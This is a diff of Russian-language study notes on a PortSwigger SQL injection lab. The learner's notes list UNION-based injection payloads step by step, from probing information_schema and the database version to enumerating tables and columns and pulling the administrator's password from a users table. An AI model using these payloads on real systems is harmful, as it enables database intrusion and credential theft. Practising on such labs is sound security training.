@@ -5,9 +5,13 @@
 изучаем SELECT * FROM 
 
 вывод всех таблиц бд
+```sql
 SELECT * FROM information_schema.tables
+```
 
+```sql
 SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+```
 вывод колонн где таблица = 'Users'
 
 https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
@@ -15,7 +19,7 @@ https://portswigger.net/web-security/sql-injection/examining-the-database/lab-li
 задание:
 
 есть пользователь administrator нужно украсть его пароль
-
+```sql
 'union+select+'ffff',null--+  ответ 200 + ffff
 
 'union+select+information_schema.tables,null--+    err500
@@ -27,51 +31,84 @@ https://portswigger.net/web-security/sql-injection/examining-the-database/lab-li
 'union+select+information_schema.tables,null--+ 500
 
 'union+select+*+from+information_schema.tables,null--+ 500
+```
 
 🟢
+```sql
 'union+select+version(),null--+
+```
 ОТВЕТ
+```c
 PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
+```
 
 
-'union+select+table_name,null+from+information_schema.tables--+ все таблицы системы
+```sql
+'union+select+table_name,null+from+information_schema.tables--+ 
+```
+все таблицы системы
 есть таблица **`users_eloiur`**
 
 
-'union+select+table_name,null+from+information_schema.tables+WHERE+table_schema='public'--+   вывел только публичные
+```sql
+'union+select+table_name,null+from+information_schema.tables+WHERE+table_schema='public'--+  
+```
+вывел только публичные
 
-'union+select+information_schema.columns,null+where+table_name=''users--+ 500
+```sql
+'union+select+information_schema.columns,null+where+table_name=''users--+ 
+```
+500
 
 
-'union+select+column_name,null+from+information_schema.colunms+where+table_name='pg_user'--+ 500
+```sql
+'union+select+column_name,null+from+information_schema.colunms+where+table_name='pg_user'--+
+```
+500
 
 
+```sql
 ' UNION SELECT NULL,column_name,NULL FROM information_schema.columns 
-   WHERE table_name='users'-- образец
+   WHERE table_name='users'-- 
+```
+   образец
 
 **`users_eloiur`**
 
 
-'union+select+column_name,null+from+information_schema.colunms+where+table_name='users_eloiur'--+   500
+```sql
+'union+select+column_name,null+from+information_schema.colunms+where+table_name='users_eloiur'--+   
+```
+500
 
 ошибка в букве в слове colunms вместо columns
-'union+select+column_name,null+from+information_schema.columns+where+table_name='users_eloiur'--+  🟢200
+```sql
+'union+select+column_name,null+from+information_schema.columns+where+table_name='users_eloiur'--+ 
+```
+🟢200
 
 
 есть email
 есть username_soetdf
 есть password_lrpxdf
 
-'union+select+username_soetdf+||+'~'+||+password_lrpxdf,null+from+information_schema.tables+where+table_name='users_eloiur'--+  500
+```sql
+'union+select+username_soetdf+||+'~'+||+password_lrpxdf,null+from+information_schema.tables+where+table_name='users_eloiur'--+  
+```
+500
 
+```sql
 'union+select+username_soetdf+||+'~'+||+password_lrpxdf,null+from+users_eloiur+--+ 
+```
 
 ответ несколько юзеров и administrator~4a2gejcan8zj5b27pgl8
 
 
 🟢
 попробую вывести только администратора
+```sql
 'union+select+username_soetdf+||+'~'+||+password_lrpxdf,null+from+users_eloiur+where+username_soetdf='administrator'+--+
+```
 
 четко! ответ только администратора!
 administrator~
@@ -80,7 +117,9 @@ administrator~
 
 доп  попробую использовать LIKE '%text'
 
+```sql
 'union+select+username_soetdf+||+'~'+||+password_lrpxdf,null+from+users_eloiur+where+username_soetdf+LIKE+'admin%'+--+
+```
 
 тоже сработало! ответ administrator~4a2gejcan8zj5b27pgl8
 четко!
